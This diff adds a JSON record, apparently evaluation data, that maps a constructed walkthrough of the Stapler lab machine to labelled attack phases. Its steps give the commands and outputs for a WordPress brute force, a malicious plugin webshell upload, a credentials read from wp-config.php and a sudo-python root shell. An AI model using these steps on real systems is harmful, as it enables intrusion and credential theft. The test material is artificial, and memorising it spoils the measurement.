@@ -1,0 +1,120 @@
+{
+  "box": "Stapler",
+  "source": "Representative walkthrough constructed from public Stapler write-up structure (WordPress on 12380 -> wpscan brute -> admin plugin upload webshell -> sudo root). Author-constructed for offline Phase-1 mapping measurement; NOT a live capture.",
+  "abstract_family": "default_or_weak_password",
+  "vulnhub_correspondence": "Second HTTP service on 12380 hosts WordPress; wpscan enumerates users and brute-forces a weak password; an authenticated admin uploads a malicious plugin for a www-data webshell; a misconfigured sudo entry escalates to root.",
+  "target_label": "https://10.10.10.5:12380",
+  "steps": [
+    {
+      "step": 0,
+      "phase": "recon",
+      "actor_intent": "Scan all ports with nmap to find the web services.",
+      "tool": "nmap",
+      "tool_command": "nmap -sV -p- 10.10.10.5",
+      "tool_output": "PORT      STATE SERVICE  VERSION\n22/tcp    open  ssh      OpenSSH 7.2p2\n80/tcp    open  http     Apache httpd\n139/tcp   open  netbios-ssn Samba smbd\n3306/tcp  open  mysql    MySQL 5.7.12\n12380/tcp open  http     Apache httpd 2.4.18",
+      "reference_abstract_action": "service_enumeration",
+      "reference_state_after": {"open_services": ["http:80", "http:12380", "mysql:3306"], "tech_stack": ["apache", "mysql"]}
+    },
+    {
+      "step": 1,
+      "phase": "enumeration",
+      "actor_intent": "Fingerprint the HTTPS application on port 12380.",
+      "tool": "whatweb",
+      "tool_command": "whatweb https://10.10.10.5:12380/blogblog/",
+      "tool_output": "https://10.10.10.5:12380/blogblog/ [200 OK] Apache[2.4.18], PHP[7.0.4], MetaGenerator[WordPress 4.2.1], WordPress[4.2.1]",
+      "reference_abstract_action": "http_fingerprint",
+      "reference_state_after": {"tech_stack": ["apache", "php", "wordpress"]}
+    },
+    {
+      "step": 2,
+      "phase": "enumeration",
+      "actor_intent": "Enumerate WordPress paths and the login form.",
+      "tool": "gobuster",
+      "tool_command": "gobuster dir -u https://10.10.10.5:12380/blogblog/ -w common.txt -k",
+      "tool_output": "/wp-login.php         (Status: 200)\n/wp-admin             (Status: 301)\n/wp-content           (Status: 301)\n/xmlrpc.php           (Status: 405)",
+      "reference_abstract_action": "web_path_enumeration",
+      "reference_state_after": {"discovered_paths": ["/wp-login.php", "/wp-admin", "/wp-content"]}
+    },
+    {
+      "step": 3,
+      "phase": "auth",
+      "actor_intent": "Brute-force the WordPress login for a known user with a wordlist.",
+      "tool": "login",
+      "tool_command": "wpscan --url https://10.10.10.5:12380/blogblog/ -U john -P rockyou.txt",
+      "tool_output": "[SUCCESS] Valid combination found: john / incorrect\nHTTP/1.1 302 Found\nSet-Cookie: wordpress_logged_in_x=john%7C...\nLocation: /wp-admin/",
+      "reference_abstract_action": "auth_attempt",
+      "role": "admin",
+      "reference_state_after": {"auth_state": "admin"}
+    },
+    {
+      "step": 4,
+      "phase": "exploit",
+      "actor_intent": "Upload a malicious plugin from the admin panel to obtain a webshell.",
+      "tool": "upload",
+      "tool_command": "POST /wp-admin/update.php?action=upload-plugin (shell.php inside zip)",
+      "tool_output": "Plugin installed successfully.\nshell.php written to /wp-content/uploads/\nHTTP/1.1 200 OK",
+      "reference_abstract_action": "file_upload_attempt",
+      "yields_shell": true,
+      "reference_state_after": {"shell_state": "webshell"}
+    },
+    {
+      "step": 5,
+      "phase": "post-exploit",
+      "actor_intent": "Run id through the uploaded shell to confirm command execution.",
+      "tool": "command",
+      "tool_command": "curl -k 'https://10.10.10.5:12380/blogblog/wp-content/uploads/shell.php?cmd=id'",
+      "tool_output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+      "reference_abstract_action": "command_execution",
+      "reference_state_after": {"shell_state": "command_execution", "privilege_level": "web_user"},
+      "candidate_pool": [
+        "Run id through the uploaded shell to confirm command execution.",
+        "Upload the malicious plugin again.",
+        "Brute-force the WordPress login that already succeeded.",
+        "Read the root flag with no privileges."
+      ]
+    },
+    {
+      "step": 6,
+      "phase": "loot",
+      "actor_intent": "Read the WordPress config to recover database credentials.",
+      "tool": "fileread",
+      "tool_command": "cat /var/www/https/blogblog/wp-config.php",
+      "tool_output": "define('DB_USER', 'root');\ndefine('DB_PASSWORD', 'plbkac');",
+      "reference_abstract_action": "sensitive_file_read",
+      "file_id": "wp_config",
+      "reference_state_after": {"read_files": ["wp_config"]}
+    },
+    {
+      "step": 7,
+      "phase": "privesc-recon",
+      "actor_intent": "Check sudo privileges and SUID binaries for an escalation path.",
+      "tool": "command",
+      "tool_command": "sudo -l; find / -perm -4000 -type f 2>/dev/null",
+      "tool_output": "Matching Defaults entries for www-data:\n    env_reset\nUser www-data may run the following commands:\n    (ALL : ALL) NOPASSWD: /usr/bin/python",
+      "reference_abstract_action": "post_exploitation",
+      "reference_state_after": {}
+    },
+    {
+      "step": 8,
+      "phase": "privesc",
+      "actor_intent": "Escalate to root by abusing the NOPASSWD sudo python entry.",
+      "tool": "privesc",
+      "tool_command": "sudo python -c 'import os; os.system(\"/bin/bash\")'",
+      "tool_output": "# id\nuid=0(root) gid=0(root) groups=0(root)\nroot",
+      "reference_abstract_action": "privilege_escalation",
+      "rooted": true,
+      "reference_state_after": {"privilege_level": "root"}
+    },
+    {
+      "step": 9,
+      "phase": "loot",
+      "actor_intent": "Read the root flag now that we are root.",
+      "tool": "fileread",
+      "tool_command": "cat /root/flag.txt",
+      "tool_output": "b6b545dc11b7a270f4bad23432190c75",
+      "reference_abstract_action": "sensitive_file_read",
+      "file_id": "root_flag",
+      "reference_state_after": {"read_files": ["root_flag"]}
+    }
+  ]
+}
